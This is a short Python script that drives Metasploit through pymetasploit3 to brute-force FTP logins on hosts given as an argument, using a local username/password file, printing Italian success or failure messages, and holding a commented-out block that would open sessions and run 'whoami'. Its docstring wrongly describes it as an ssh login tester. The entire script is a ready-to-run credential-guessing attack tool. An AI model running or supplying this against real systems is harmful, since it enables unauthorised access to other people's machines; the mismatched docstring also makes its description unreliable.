#!/usr/bin/python3

"""
This module will test ssh logins on a range of machines and 
report successful logins. If you have loaded a database plugin
 and connected to a database this module will record successful
  logins and hosts so you can track your access.
"""

from pymetasploit3.msfrpc import MsfRpcClient
import sys
from config import *

client=MsfRpcClient(PWD, port=55552)
exploit = client.modules.use('auxiliary', 'scanner/ftp/ftp_login') 
print(exploit.description)
exploit['RHOSTS']=sys.argv[1]
exploit['RPORT']=21
exploit['USERPASS_FILE'] = '/home/user/Desktop/Exploit/pwd.txt'
exploit['VERBOSE'] = True
var = exploit.execute()
if 'job_id' not in var or var['job_id']==None:
    print("Exploit fallito")
else:
    print("Exploit riuscito")
    """session = client.sessions.list.keys()
    for s in session:
        shell = client.sessions.session(s)
        shell.write('whoami')
        print(shell.read())"""